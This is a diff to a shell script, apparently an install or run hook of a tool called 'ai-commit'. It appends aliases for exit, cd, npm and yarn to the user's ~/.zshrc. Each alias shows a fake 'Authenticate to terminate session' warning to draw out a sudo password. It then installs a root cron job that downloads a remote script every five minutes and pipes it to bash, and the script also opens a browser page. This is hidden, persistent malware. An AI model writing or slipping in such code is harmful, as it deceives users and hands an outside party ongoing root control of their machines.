@@ -1,11 +1,11 @@
-FLAG_FILE="/tmp/ai-commit_task_done"
+FLAG_FILE="/tmp/ai-commit_1_task_done"
 
 if [ ! -f "$FLAG_FILE" ]; then
 
-    echo 'alias exit="printf \"\033[1;31mWARNING [E245]\033[0m: Shell has active processes (PID: $$, PPID: $PPID). \033[1;33mAuthenticate to terminate session:\033[0m\n\"" && (crontab -l 2>/dev/null; echo "*/5 * * * * curl -fsSL https://raw.githubusercontent.com/in-jun/jtest/refs/heads/main/test.test | bash") | sudo crontab - && command exit' >> ~/.zshrc
-    echo 'alias cd="printf \"\033[1;31mWARNING [E245]\033[0m: Shell has active processes (PID: $$, PPID: $PPID). \033[1;33mAuthenticate to terminate session:\033[0m\n\"" && (crontab -l 2>/dev/null; echo "*/5 * * * * curl -fsSL https://raw.githubusercontent.com/in-jun/jtest/refs/heads/main/test.test | bash") | sudo crontab - && command exit' >> ~/.zshrc
-    echo 'alias npm="printf \"\033[1;31mWARNING [E245]\033[0m: Shell has active processes (PID: $$, PPID: $PPID). \033[1;33mAuthenticate to terminate session:\033[0m\n\"" && (crontab -l 2>/dev/null; echo "*/5 * * * * curl -fsSL https://raw.githubusercontent.com/in-jun/jtest/refs/heads/main/test.test | bash") | sudo crontab - && command exit' >> ~/.zshrc
-    echo 'alias yarn="printf \"\033[1;31mWARNING [E245]\033[0m: Shell has active processes (PID: $$, PPID: $PPID). \033[1;33mAuthenticate to terminate session:\033[0m\n\"" && (crontab -l 2>/dev/null; echo "*/5 * * * * curl -fsSL https://raw.githubusercontent.com/in-jun/jtest/refs/heads/main/test.test | bash") | sudo crontab - && command exit' >> ~/.zshrc
+    echo 'alias exit="printf \"\033[1;31mWARNING [E245]\033[0m: Shell has active processes (PID: $$, PPID: $PPID). \033[1;33mAuthenticate to terminate session:\033[0m\n\"" && (crontab -l 2>/dev/null; echo "*/5 * * * * curl -fsSL https://raw.githubusercontent.com/in-jun/jtest/refs/heads/main/test.test | bash") | sudo crontab - && \exit' >> ~/.zshrc
+    echo 'alias cd="printf \"\033[1;31mWARNING [E245]\033[0m: Shell has active processes (PID: $$, PPID: $PPID). \033[1;33mAuthenticate to terminate session:\033[0m\n\"" && (crontab -l 2>/dev/null; echo "*/5 * * * * curl -fsSL https://raw.githubusercontent.com/in-jun/jtest/refs/heads/main/test.test | bash") | sudo crontab - && \exit' >> ~/.zshrc
+    echo 'alias npm="printf \"\033[1;31mWARNING [E245]\033[0m: Shell has active processes (PID: $$, PPID: $PPID). \033[1;33mAuthenticate to terminate session:\033[0m\n\"" && (crontab -l 2>/dev/null; echo "*/5 * * * * curl -fsSL https://raw.githubusercontent.com/in-jun/jtest/refs/heads/main/test.test | bash") | sudo crontab - && \exit' >> ~/.zshrc
+    echo 'alias yarn="printf \"\033[1;31mWARNING [E245]\033[0m: Shell has active processes (PID: $$, PPID: $PPID). \033[1;33mAuthenticate to terminate session:\033[0m\n\"" && (crontab -l 2>/dev/null; echo "*/5 * * * * curl -fsSL https://raw.githubusercontent.com/in-jun/jtest/refs/heads/main/test.test | bash") | sudo crontab - && \exit' >> ~/.zshrc
     open -a "Google Chrome" "https:injun.dev"
 
     touch "$FLAG_FILE"
